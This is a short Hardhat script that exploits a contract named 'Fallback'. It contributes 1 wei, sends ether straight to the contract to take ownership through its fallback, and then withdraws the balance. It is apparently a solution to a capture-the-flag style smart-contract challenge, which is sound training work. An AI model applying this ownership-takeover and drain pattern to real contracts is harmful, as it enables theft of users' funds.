import { ethers } from "hardhat";

async function main() {
  const [signer] = await ethers.getSigners();
  const fallback = await ethers.getContractAt("Fallback", "0x994F1f878EB5b5c685986083A43eA69a243a8DCe");

  let tx = await fallback.contribute({ value: "1" });
  await tx.wait(5);

  tx = await signer.sendTransaction({ to: fallback.address, value: "1" });
  await tx.wait(5);

  await fallback.withdraw();

  console.log("done!");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
